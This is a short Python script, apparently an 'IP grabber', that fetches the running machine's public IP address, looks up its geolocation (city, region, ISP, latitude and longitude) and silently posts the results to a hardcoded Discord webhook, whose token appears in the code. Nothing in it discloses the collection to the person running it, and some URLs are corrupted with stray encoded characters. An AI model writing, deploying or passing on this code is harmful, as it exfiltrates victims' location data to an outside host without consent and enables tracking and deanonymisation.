import requests
import json
from dhooks import Webhook, Embed
from datetime import datetime

hook = Webhook("https://discord.com/api/webhooks/796099638415327282/j0gBUradIQKPoXg28bSsy0-_Uo5iCxpUXXLgs_VPuXa6QQiKEel8-24kBTIZ1NgDA6F2%22)

time = datetime.now().strftime("%H:%M %p")
ip = requests.get('https://api.ipify.org/%27).text

r = requests.get(f'http://extreme-ip-lookup.com/json/%7Bip%7D%27)
geo = r.json()
embed = Embed()
fields = [
    {'name': 'IP', 'value': geo['query']},
    {'name': 'ipType', 'value': geo['ipType']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'City', 'value': geo['city']},
    {'name': 'Continent', 'value': geo['continent']},
    {'name': 'Country', 'value': geo['country']},
    {'name': 'IPName', 'value': geo['ipName']},
    {'name': 'ISP', 'value': geo['isp']},
    {'name': 'Latitute', 'value': geo['lat']},
    {'name': 'Longitude', 'value': geo['lon']},
    {'name': 'Org', 'value': geo['org']},
    {'name': 'Region', 'value': geo['region']},
    {'name': 'Status', 'value': geo['status']},
]
for field in fields:
    if field['value']:
        embed.add_field(name=field['name'], value=field['value'], inline=True)
hook.send(embed=embed)